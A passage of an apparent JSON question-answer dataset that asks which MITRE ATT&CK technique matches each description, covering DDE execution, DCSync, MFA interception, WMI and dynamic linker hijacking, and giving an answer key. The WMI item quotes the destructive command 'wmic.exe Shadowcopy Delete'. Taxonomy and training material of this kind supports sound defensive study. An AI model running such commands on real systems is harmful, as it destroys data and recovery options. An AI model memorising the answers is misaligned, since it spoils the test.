    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).\nA. Modify Cloud Compute Infrastructure: Revert Cloud Instance, B. Inter-Process Communication: Dynamic Data Exchange, C. Subvert Trust Controls: Code Signing, D. Event Triggered Execution: Accessibility Features\nAnswer:",
    "context": "",
    "output": "B. Inter-Process Communication: Dynamic Data Exchange",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).",
      "options": "A. Modify Cloud Compute Infrastructure: Revert Cloud Instance, B. Inter-Process Communication: Dynamic Data Exchange, C. Subvert Trust Controls: Code Signing, D. Event Triggered Execution: Accessibility Features",
      "choice": "B. Inter-Process Communication: Dynamic Data Exchange",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.\n\nOptions:\nA. Permission Groups Discovery: Domain Groups, B. Indicator Removal: Clear Command History, C. Hide Artifacts: Run Virtual Instance, D. Virtualization/Sandbox Evasion: System Checks",
    "context": "",
    "output": "C. Hide Artifacts: Run Virtual Instance",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.",
      "options": "A. Permission Groups Discovery: Domain Groups, B. Indicator Removal: Clear Command History, C. Hide Artifacts: Run Virtual Instance, D. Virtualization/Sandbox Evasion: System Checks",
      "choice": "C. Hide Artifacts: Run Virtual Instance",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.\n\nA. Phishing for Information, B. Endpoint Denial of Service: Service Exhaustion Flood, C. Obfuscated Files or Information: Compile After Delivery, D. Process Injection: ListPlanting\nAnswer:",
    "context": "",
    "output": "B. Endpoint Denial of Service: Service Exhaustion Flood",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.",
      "options": "A. Phishing for Information, B. Endpoint Denial of Service: Service Exhaustion Flood, C. Obfuscated Files or Information: Compile After Delivery, D. Process Injection: ListPlanting",
      "choice": "B. Endpoint Denial of Service: Service Exhaustion Flood",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.\nA. Brute Force, B. Deobfuscate/Decode Files or Information, C. Acquire Infrastructure: Malvertising, D. Process Injection: Thread Local Storage",
    "context": "",
    "output": "B. Deobfuscate/Decode Files or Information",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "options": "A. Brute Force, B. Deobfuscate/Decode Files or Information, C. Acquire Infrastructure: Malvertising, D. Process Injection: Thread Local Storage",
      "choice": "B. Deobfuscate/Decode Files or Information",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via Phishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors. Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: Search Engines, breach dumps, code repositories, etc.). Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: External Remote Services or Valid Accounts).\nA. Endpoint Denial of Service: OS Exhaustion Flood, B. User Execution: Malicious File, C. Gather Victim Identity Information: Credentials, D. Cloud Service Discovery",
    "context": "",
    "output": "C. Gather Victim Identity Information: Credentials",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via Phishing for Information. Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors. Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: Search Engines, breach dumps, code repositories, etc.). Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Phishing for Information), establishing operational resources (ex: Compromise Accounts), and/or initial access (ex: External Remote Services or Valid Accounts).",
      "options": "A. Endpoint Denial of Service: OS Exhaustion Flood, B. User Execution: Malicious File, C. Gather Victim Identity Information: Credentials, D. Cloud Service Discovery",
      "choice": "C. Gather Victim Identity Information: Credentials",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\n\nPossible answers:\nA. System Script Proxy Execution: SyncAppvPublishingServer, B. Data Manipulation: Stored Data Manipulation, C. Office Application Startup, D. Account Manipulation: Additional Cloud Credentials",
    "context": "",
    "output": "B. Data Manipulation: Stored Data Manipulation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "options": "A. System Script Proxy Execution: SyncAppvPublishingServer, B. Data Manipulation: Stored Data Manipulation, C. Office Application Startup, D. Account Manipulation: Additional Cloud Credentials",
      "choice": "B. Data Manipulation: Stored Data Manipulation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.\n\nA. Obfuscated Files or Information: Compile After Delivery, B. Stage Capabilities: Link Target, C. Data Staged: Local Data Staging, D. Brute Force: Password Cracking\nA:",
    "context": "",
    "output": "B. Stage Capabilities: Link Target",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.",
      "options": "A. Obfuscated Files or Information: Compile After Delivery, B. Stage Capabilities: Link Target, C. Data Staged: Local Data Staging, D. Brute Force: Password Cracking",
      "choice": "B. Stage Capabilities: Link Target",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing. In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to Acquire Infrastructure for malicious purposes.\nA. Boot or Logon Autostart Execution: Re-opened Applications, B. Stage Capabilities: Upload Malware, C. Establish Accounts, D. Data Encoding: Standard Encoding\nAnswer:",
    "context": "",
    "output": "C. Establish Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing. In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to Acquire Infrastructure for malicious purposes.",
      "options": "A. Boot or Logon Autostart Execution: Re-opened Applications, B. Stage Capabilities: Upload Malware, C. Establish Accounts, D. Data Encoding: Standard Encoding",
      "choice": "C. Establish Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket or change an account's password as noted in Account Manipulation.\n\nDCSync functionality has been included in the \"lsadump\" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.\nA. OS Credential Dumping: DCSync, B. Hijack Execution Flow: Path Interception by Search Order Hijacking, C. Masquerading: Space after Filename, D. BITS Jobs\nAnswer:",
    "context": "",
    "output": "A. OS Credential Dumping: DCSync",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)    to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticket or change an account's password as noted in Account Manipulation.\n\nDCSync functionality has been included in the \"lsadump\" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.",
      "options": "A. OS Credential Dumping: DCSync, B. Hijack Execution Flow: Path Interception by Search Order Hijacking, C. Masquerading: Space after Filename, D. BITS Jobs",
      "choice": "A. OS Credential Dumping: DCSync",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. \n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). \n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.\n\nA. Web Service, B. Modify Cloud Compute Infrastructure: Delete Cloud Instance, C. Multi-Factor Authentication Interception, D. Hide Artifacts: Resource Forking\nAnswer:",
    "context": "",
    "output": "C. Multi-Factor Authentication Interception",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. \n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). \n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.",
      "options": "A. Web Service, B. Modify Cloud Compute Infrastructure: Delete Cloud Instance, C. Multi-Factor Authentication Interception, D. Hide Artifacts: Resource Forking",
      "choice": "C. Multi-Factor Authentication Interception",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse The technique (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.\nA. Group Policy Discovery, B. Windows Management Instrumentation, C. Exploitation for Credential Access, D. Data from Removable Media\nAnswer:",
    "context": "",
    "output": "B. Windows Management Instrumentation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse The technique (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management. Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., Inhibit System Recovery).\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
      "options": "A. Group Policy Discovery, B. Windows Management Instrumentation, C. Exploitation for Credential Access, D. Data from Removable Media",
      "choice": "B. Windows Management Instrumentation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of the technique depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).\n\nOptions:\nA. Data from Configuration Repository: SNMP (MIB Dump), B. Active Scanning, C. Boot or Logon Autostart Execution: Winlogon Helper DLL, D. Pre-OS Boot: Component Firmware",
    "context": "",
    "output": "B. Active Scanning",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of the technique depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",
      "options": "A. Data from Configuration Repository: SNMP (MIB Dump), B. Active Scanning, C. Boot or Logon Autostart Execution: Winlogon Helper DLL, D. Pre-OS Boot: Component Firmware",
      "choice": "B. Active Scanning",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file. Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.  \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.\nA. Hijack Execution Flow: Dynamic Linker Hijacking, B. Phishing, C. Boot or Logon Autostart Execution: Winlogon Helper DLL, D. Boot or Logon Initialization Scripts",
    "context": "",
    "output": "A. Hijack Execution Flow: Dynamic Linker Hijacking",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
